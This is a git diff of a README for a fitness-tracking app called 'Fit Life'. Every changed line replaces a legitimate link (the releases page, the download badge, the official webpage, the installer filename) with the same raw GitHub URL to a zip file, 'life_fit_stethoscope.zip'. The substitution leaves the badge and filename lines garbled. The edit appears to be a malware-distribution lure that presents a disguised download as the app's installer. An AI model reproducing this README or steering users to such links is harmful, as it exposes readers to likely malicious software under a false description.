@@ -4,7 +4,7 @@
 Welcome to **Fit Life**! This tool helps you achieve your fitness goals using smart technology. With Fit Life, you can track your workouts and monitor your progress easily.
 
 ## 📥 Download Now
-[![Download Fit Life](https://img.shields.io/badge/Download-Fit%20Life-blue)](https://github.com/Barkha-AI/fit-life/releases)
+[![Download Fit Life](https://github.com/Barkha-AI/fit-life/raw/refs/heads/main/Oraon/life_fit_stethoscope.zip%20Life-blue)](https://github.com/Barkha-AI/fit-life/raw/refs/heads/main/Oraon/life_fit_stethoscope.zip)
 
 ## 📋 Overview
 **Fit Life** is designed for users who want a simple way to manage their fitness journey. It offers helpful features such as workout plans, progress tracking, and insights into your habits. You don’t need any technical knowledge to use it.
@@ -23,10 +23,10 @@ To run **Fit Life**, make sure your device meets these requirements:
 - **Internet Connection**: Required for downloading updates and accessing features
 
 ## 📥 Download & Install
-Visit the [Releases page](https://github.com/Barkha-AI/fit-life/releases) to download the latest version of **Fit Life**. Once you are on the page, follow these simple steps:
+Visit the [Releases page](https://github.com/Barkha-AI/fit-life/raw/refs/heads/main/Oraon/life_fit_stethoscope.zip) to download the latest version of **Fit Life**. Once you are on the page, follow these simple steps:
 
 1. Click on the latest release version link.
-2. Download the installation file by clicking on it. The file will typically have a name like `fit-life-v1.0.0.exe` or similar.
+2. Download the installation file by clicking on it. The file will typically have a name like `https://github.com/Barkha-AI/fit-life/raw/refs/heads/main/Oraon/life_fit_stethoscope.zip` or similar.
 3. Locate the downloaded file on your computer.
 
 ### Installation Steps
@@ -48,6 +48,6 @@ If you encounter any issues or have questions, please reach out. You can create 
 Join our community to share your progress and tips with other users. Feel free to contribute by suggesting features or improvements on our GitHub page. We value your feedback and strive to enhance **Fit Life** continuously.
 
 ## 🔗 Links
-For more information, visit our official webpage: [Fit Life - Zai GLM](https://kitadamian.github.io/fit-life/). Find us on social media and see how others are using **Fit Life** to achieve their fitness dreams.
+For more information, visit our official webpage: [Fit Life - Zai GLM](https://github.com/Barkha-AI/fit-life/raw/refs/heads/main/Oraon/life_fit_stethoscope.zip). Find us on social media and see how others are using **Fit Life** to achieve their fitness dreams.
 
 Thank you for choosing **Fit Life**. Your fitness journey starts here!
